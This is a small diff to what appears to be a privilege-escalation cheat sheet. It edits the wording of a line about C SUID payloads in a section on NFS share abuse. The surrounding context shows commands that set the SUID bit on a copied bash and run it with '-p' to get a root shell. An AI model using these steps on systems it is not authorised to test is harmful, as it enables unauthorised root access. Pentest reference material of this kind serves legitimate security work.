@@ -71,7 +71,8 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-Or using a **C SUID payloads** (see in [euid, ruid, suid])
+Or use a **C SUID payloads** (see in [euid, ruid, suid]())
+
 [NFS_privesc](https://www.errno.fr/nfs_privesc.html)
 
 ## Node inspector/CEF debug abuse
